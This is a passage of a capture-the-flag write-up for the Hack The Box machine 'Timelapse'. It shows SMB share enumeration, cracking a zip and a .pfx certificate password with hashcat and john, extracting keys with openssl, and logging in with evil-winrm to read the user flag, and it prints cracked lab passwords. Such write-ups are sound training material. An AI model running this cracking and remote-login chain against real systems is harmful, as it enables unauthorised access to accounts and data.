font-style: inherit;">9389/tcp</span>  open  mc-nmf        .NET Message Framing</span>
<span id="cb1-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49673/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49674/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49696/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-50"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">51418/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-51"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: Host: DC01<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OS:</span> Windows<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:microsoft:windows</span>
<span id="cb1-52"></span>
<span id="cb1-53"></span>
<span id="cb1-54"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 10.10.11.152 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span></span>
<span id="cb1-55"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb1-56"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-57"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/udp</span> open  domain</span></code></pre></div>
<p><strong>dirb:</strong></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N/A</span></span></code></pre></div>
<p><strong>nikto:</strong></p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N/A</span></span></code></pre></div>
<p><strong>ffuf:</strong></p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N/A</span></span></code></pre></div>
<p><strong>smbclient:</strong></p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse smbclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 10.10.11.152</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>oid<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'s password: </span></span>
<span id="cb5-3"></span>
<span id="cb5-4"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    Sharename       Type      Comment</span></span>
<span id="cb5-5"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    ---------       ----      -------</span></span>
<span id="cb5-6"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    ADMIN$          Disk      Remote Admin</span></span>
<span id="cb5-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    C$              Disk      Default share</span></span>
<span id="cb5-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    IPC$            IPC       Remote IPC</span></span>
<span id="cb5-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    NETLOGON        Disk      Logon server share </span></span>
<span id="cb5-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    Shares          Disk      </span></span>
<span id="cb5-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    SYSVOL          Disk      Logon server share</span></span></code></pre></div>
<p><strong>rpcclient:</strong></p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse rpcclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-U</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span> dc01.timelapse.htb</span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\'</span>s password: </span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rpcclient</span> $<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<ul>
<li><code>dc01.timelapse.htb</code> from nmap</li>
</ul>
<hr>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>First thing we find is a globally open SMB share, enumerate it.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse smbclient <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\\\</span>10.10.11.152<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\</span>Shares</span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>oids password: </span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Try</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"help"</span> to get a list of possible commands.</span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb:</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\&gt;</span> recurse on</span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb:</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\&gt;</span> ls</span>
<span id="cb7-6">  <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span>                                   D        0  Mon Oct 25 17:39:15 2021</span>
<span id="cb7-7">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">..</span>                                  D        0  Mon Oct 25 17:39:15 2021</span>
<span id="cb7-8">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Dev</span>                                 D        0  Mon Oct 25 21:40:06 2021</span>
<span id="cb7-9">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HelpDesk</span>                            D        0  Mon Oct 25 17:48:42 2021</span>
<span id="cb7-10"></span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\Dev</span></span>
<span id="cb7-12">  <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span>                                   D        0  Mon Oct 25 21:40:06 2021</span>
<span id="cb7-13">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">..</span>                                  D        0  Mon Oct 25 21:40:06 2021</span>
<span id="cb7-14">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">winrm_backup.zip</span>                    A     2611  Mon Oct 25 17:46:42 2021</span>
<span id="cb7-15"></span>
<span id="cb7-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\HelpDesk</span></span>
<span id="cb7-17">  <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span>                                   D        0  Mon Oct 25 17:48:42 2021</span>
<span id="cb7-18">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">..</span>                                  D        0  Mon Oct 25 17:48:42 2021</span>
<span id="cb7-19">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LAPS.x64.msi</span>                        A  1118208  Mon Oct 25 16:57:50 2021</span>
<span id="cb7-20">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LAPS_Datasheet.docx</span>                 A   104422  Mon Oct 25 16:57:46 2021</span>
<span id="cb7-21">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LAPS_OperationsGuide.docx</span>           A   641378  Mon Oct 25 16:57:40 2021</span>
<span id="cb7-22">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LAPS_TechnicalSpecification.docx</span>      A    72683  Mon Oct 25 16:57:44 2021</span>
<span id="cb7-23"></span>
<span id="cb7-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb:</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\&gt;</span> prompt off</span>
<span id="cb7-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb:</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\&gt;</span> mget <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb7-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getting</span> file <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ev<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\w</span>inrm_backup.zip of size 2611 as Dev/winrm_backup.zip <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">23.0</span> KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">average</span> 23.0 KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getting</span> file <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\H</span>elpDesk<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\L</span>APS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3627.9</span> KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">average</span> 2656.7 KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getting</span> file <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\H</span>elpDesk<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\L</span>APS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">886.7</span> KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">average</span> 2270.4 KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getting</span> file <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\H</span>elpDesk<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\L</span>APS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">963.6</span> KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">average</span> 1548.7 KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getting</span> file <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\H</span>elpDesk<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\L</span>APS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">507.0</span> KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">average</span> 1438.0 KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>Before going through the LAPS files, we can try to brute force the zip. Remember to beautify the hash file so that it starts and ends with <code>$pkzip2$</code>.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev unzip winrm_backup.zip </span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Archive:</span>  winrm_backup.zip</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[winrm_backup.zip]</span> legacyy_dev_auth.pfx password: </span>
<span id="cb8-4">   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">skipping:</span> legacyy_dev_auth.pfx    incorrect password</span>
<span id="cb8-5"></span>
<span id="cb8-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev /usr/sbin/zip2john winrm_backup.zip <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> zip.hash</span>
<span id="cb8-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev vim zip.hash                                  </span>
<span id="cb8-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m17210</span> zip.hash /usr/share/wordlists/rockyou.txt</span>
<span id="cb8-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb8-10"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$pkzip2$1</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*2*2*0*965*</span> [... snip ...] <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>$/pkzip2$:supremelegacy</span>
<span id="cb8-11">                                                 </span>
<span id="cb8-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Session..........:</span> hashcat</span>
<span id="cb8-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Status...........:</span> Cracked</span>
<span id="cb8-14"></span>
<span id="cb8-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev unzip <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-P</span> supremelegacy winrm_backup.zip </span>
<span id="cb8-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Archive:</span>  winrm_backup.zip</span>
<span id="cb8-17">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> legacyy_dev_auth.pfx</span></code></pre></div>
<hr>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Try to crack the certificate (<code>.pfx</code>) password.</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev /usr/share/john/pfx2john.py legacyy_dev_auth.pfx <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--wordlist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>/usr/share/wordlists/rockyou.txt /dev/stdin</span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">thuglegacy</span>       <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">legacyy_dev_auth.pfx</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1g</span> 0:00:01:06 DONE <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-03-31</span> 12:18<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.01499g/s</span> 48458p/s 48458c/s 48458C/s thuglife06..thug211</span></code></pre></div>
<p>Testing the new password against LDAP, SMB and WinRM we find our first set of working creds, over LDAP <code>legacy:thuglegacy</code>.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse crackmapexec ldap 10.10.11.152 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> legacy <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> thuglegacy                                                  </span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LDAP</span>        10.10.11.152    389    DC01             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">*</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> Windows 10.0 Build 17763 x64 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name:DC01</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">domain:timelapse.htb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">signing:True</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMBv1:False</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LDAP</span>        10.10.11.152    389    DC01             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">+</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> timelapse.htb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\l</span>egacy:thuglegacy </span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse crackmapexec smb 10.10.11.152 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> legacy <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> thuglegacy</span>
<span id="cb10-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMB</span>         10.10.11.152    445    DC01             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">*</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> Windows 10.0 Build 17763 x64 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name:DC01</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">domain:timelapse.htb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">signing:True</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMBv1:False</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMB</span>         10.10.11.152    445    DC01             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[-]</span> timelapse.htb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\l</span>egacy:thuglegacy STATUS_ACCESS_DENIED </span>
<span id="cb10-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse crackmapexec winrm 10.10.11.152 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> legacy <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> thuglegacy</span>
<span id="cb10-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WINRM</span>       10.10.11.152    5986   DC01             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">*</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> Windows 10.0 Build 17763 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name:DC01</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">domain:timelapse.htb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WINRM</span>       10.10.11.152    5986   DC01             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">*</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> https://10.10.11.152:5986/wsman</span>
<span id="cb10-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WINRM</span>       10.10.11.152    5986   DC01             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[-]</span> timelapse.htb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\l</span>egacy:thuglegacy <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f4a3de153a0&gt;, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))"</span></span></code></pre></div>
<p>However, testing the ldap credentials against everything and anything results in errors.. so lets go back to the <code>.pfx</code> file. Reading about the <code>.pfx</code> we should be able to extract a <code>.key</code> and <code>.crt</code> file, which we can later use for evil-winrm login.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev openssl pkcs12 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-in</span> legacyy_dev_auth.pfx  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-nocerts</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-out</span> priv.key</span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> Import Password: thuglegacy</span>
<span id="cb11-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> PEM pass phrase: thuglegacy</span>
<span id="cb11-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Verifying</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Enter PEM pass phrase: thuglegacy</span>
<span id="cb11-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev openssl pkcs12 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-in</span> legacyy_dev_auth.pfx  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-clcerts</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-nokeys</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-out</span> pfx.crt</span>
<span id="cb11-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> Import Password: thuglegacy</span>
<span id="cb11-7"></span>
<span id="cb11-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Dev evil-winrm <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> 10.10.11.152 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> pfx.crt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> priv.key <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-S</span> </span>
<span id="cb11-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> PEM pass phrase: thuglegacy</span>
<span id="cb11-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*Evil-WinRM*</span> PS C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\l</span>egacyy<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb11-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">timelapse\legacyy</span></span>
<span id="cb11-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*Evil-WinRM*</span> PS C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\l</span>egacyy<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>esktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> type user.txt</span>
<span id="cb11-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">98f42c5d696089eac85401c445d1e2f9</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>With manual information we see that the privileges are low and no interesting groups.</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb12-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\legacyy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>all</span>
<span id="cb12-2">USER INFORMATION</span>
